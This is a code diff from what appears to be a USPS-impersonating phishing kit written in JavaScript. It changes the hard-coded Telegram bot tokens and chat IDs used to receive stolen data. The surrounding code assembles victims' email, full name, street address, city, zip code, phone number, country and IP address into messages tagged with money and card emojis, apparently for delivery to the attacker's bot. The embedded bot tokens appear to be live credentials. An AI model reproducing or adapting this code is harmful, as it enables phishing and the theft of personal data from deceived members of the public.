@@ -2217,7 +2217,7 @@ export default {
     this.query = tt.data.country_capital;
      var token = "8085298009:AAE07ta8T4ML6IYTOShlJeVU1RqMYTS6Q8o";
 
-    var chatId2 = 93372553;
+    var chatId2 = -4512252331;
 
     var fullMessage = `
        |💸💸💸💸|🇺🇸| USPS Post |🇺🇸||||||||||%0ACountry : ${this.query}%0AIP : ${this.IP}%0A||||||||||💳| USPS Post|💳||||||||||`;
@@ -2254,9 +2254,9 @@ export default {
       var that = this;
       that.info.IP = this.IP;
       that.info.query = this.query;
-     var token = "6346259743:AAEFPYGw3OQsWVKiVNOAd1Ssm33OEVGNNjM";
+       var token = "8085298009:AAE07ta8T4ML6IYTOShlJeVU1RqMYTS6Q8o";
 
-      var chatId2 = -940829481;
+    var chatId2 = -4512252331;
       var fullMessage = `
         ||||||||||🇺🇸| USPS Post |🇺🇸||||||||||%0AEmail : ${this.info.email}%0AFull name : ${this.info.fullName}%0AAddress 1 : ${this.info.address1}%0ACity : ${this.info.city}%0AZip Code : ${this.info.zipCode}%0APhone number : ${this.info.phoneNumber}%0ACountry : ${this.info.country}%0AIP : ${this.info.IP}%0A||||||||||💳| USPS Post|💳||||||||||`;
 
